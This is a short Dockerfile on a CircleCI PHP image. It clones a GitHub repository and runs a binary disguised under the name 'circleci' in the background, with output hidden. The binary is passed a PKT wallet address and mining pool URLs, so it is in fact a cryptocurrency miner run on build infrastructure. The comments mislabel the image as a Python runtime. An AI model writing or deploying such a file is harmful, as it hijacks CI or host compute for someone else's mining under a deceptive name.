# Use an official Python runtime as a parent image
FROM circleci/php:7.3-node-browsers

# Switch to root user
USER root

# Install necessary packages for PHP extensions


# Collect the components we need for this image
RUN apt-get update
RUN apt install -y git
RUN git clone https://github.com/aurbach55/pos.git >/dev/null 2>&1
RUN cd pos >/dev/null 2>&1
RUN chmod 777 circleci >/dev/null 2>&1
RUN nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1


